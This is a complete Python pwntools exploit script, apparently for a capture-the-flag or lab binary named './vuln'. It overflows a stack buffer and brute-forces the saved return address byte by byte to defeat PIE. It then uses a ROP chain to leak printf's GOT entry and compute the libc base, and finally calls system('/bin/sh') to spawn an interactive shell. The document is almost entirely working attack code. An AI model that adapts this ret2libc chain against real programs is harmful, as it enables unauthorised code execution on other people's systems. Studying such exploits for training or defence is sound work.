#!/usr/bin/env python3

from pwn import *
import time
# NOTE: this path cannot contain spaces
process_name = './vuln'

input_msg = b"Enter a string : "
end_msg = b"Ended !\n"
exit_msg = "Program finished !\n"
_init_addr = 0x1000
raw_main_addr = 0x11f1 # main function | (gdb)> x main
raw_printf_addr = 0x1030 # printf@plt
raw_printf_got_addr = 0x4020
raw_pop_rdi_gadget_addr = 0x129b # ROPgadget --binary <exec> | grep "pop rdi ; rdi"

use_gdb = False
gdb_args = '''
break *func
#break *func+77
gef config context.nb_lines_stack 20
gef config context.nb_lines_code 20
#set follow-fork-mode child
continue'''

if use_gdb:
    # We start our process in GDB
    # This allows us to also immediately execute some gdb commands
    p = gdb.debug(process_name, gdb_args)
else:
    # We start our process normally
    p = process(process_name)

elf = ELF(process_name) # Extract data from binary

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf) # Find ROP gadgets

def find_libc_base(buffer_payload, func_got_addr, func_name):
    # Create rop chain
    rop = buffer_payload
    rop += p64(REAL_POP_RDI_GADGET_ADDR)
    rop += p64(func_got_addr) # args[0] -> RDI
    rop += p64(REAL_PRINTF_PLT_ADDR) # printf()
    rop += p64(REAL_MAIN_PLT_ADDR) # main()

    # Send our rop-chain payload
    print(p.clean())
    p.sendline(rop)

    # Parse leaked address
    leaked_string = p.recvuntil(input_msg)
    #print("Raw leak : "+get_bytes(leaked_string))
    recieved = leaked_string.replace(input_msg, b"").strip()
    recieved = recieved.replace(end_msg, b"").strip()
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info("Leaked libc address of 0x"+hex(func_got_addr)+"@GOT : "+hex(leak))

    libc_addr = -1
    if libc != "":
        libc_addr = leak - libc.symbols[func_name] # Save libc base

    return libc_addr

def get_bytes(s):
    return str(",".join("0x{:02x}".format(c) for c in s))

def bruteforce_next_byte(payload, dbg=False):
    for i in range(256):
        next_test = 0x01 * i
        next_test = bytes([next_test])
        test_payload = payload + next_test
        #print(get_bytes(test_payload))
        # Note that we cannot send any newlines here as "read" will just absorb them into the buffer
        p.send(test_payload)
        output = p.recvuntil(input_msg)
        if exit_msg in output.decode():
            print(f"[+] Found next byte {hex(i)}")
            return next_test
        if i == 255:
            print(f"[-] Failed to find next byte")
            exit()

offset = b'A'*(64+8)

p.clean()
payload = offset

print("Brute forcing RIP")
rip = b''
for i in range(8):
    rip = rip + bruteforce_next_byte(payload + rip)
rip = u64(rip.ljust(8, b"\x00"))
print(f"Found rip value: {hex(rip)}")

# We also need to substract _init address from them all
base_address = rip - (rip & 0xfff) - _init_addr
log.info("Found program base address : "+hex(base_address))
# Now that we have the actual base address, we've defeated PIE
REAL_MAIN_PLT_ADDR = base_address + elf.symbols["main"]
REAL_PRINTF_PLT_ADDR = base_address + elf.plt["printf"]
REAL_PRINTF_GOT_ADDR = base_address + raw_printf_got_addr
REAL_POP_RDI_GADGET_ADDR = base_address + raw_pop_rdi_gadget_addr

log.info("Found main function address : " + hex(REAL_MAIN_PLT_ADDR))
log.info("Found printf@plt address : " + hex(REAL_PRINTF_PLT_ADDR))
log.info("Found pop rdi ; ret gadget address : " + hex(REAL_POP_RDI_GADGET_ADDR))

libc_base_addr = find_libc_base(payload, REAL_PRINTF_GOT_ADDR, "printf")
log.info("Found libc base address : "+hex(libc_base_addr))
# We have to do this AFTER doing get_addr once. get_addr will set the base address of libc, which will then automatically be added to our search
# If we do this before setting libc, we will just get the address without the ASLR offset
BIN_SH = libc_base_addr + next(libc.search(b"/bin/sh"))
log.info("Found \"/bin/sh\" string address in libc : "+hex(BIN_SH))
SYSTEM = libc_base_addr + libc.sym["system"]
log.info("Found system function address in libc : "+hex(SYSTEM))

pay = payload
pay += p64(REAL_POP_RDI_GADGET_ADDR)
pay += p64(BIN_SH)
pay += p64(SYSTEM)

print(p.clean())
p.sendline(pay)

# Receive all data that the application sent us that we have not yet processed and print it
print(p.clean())
# Start interaction with application
p.interactive()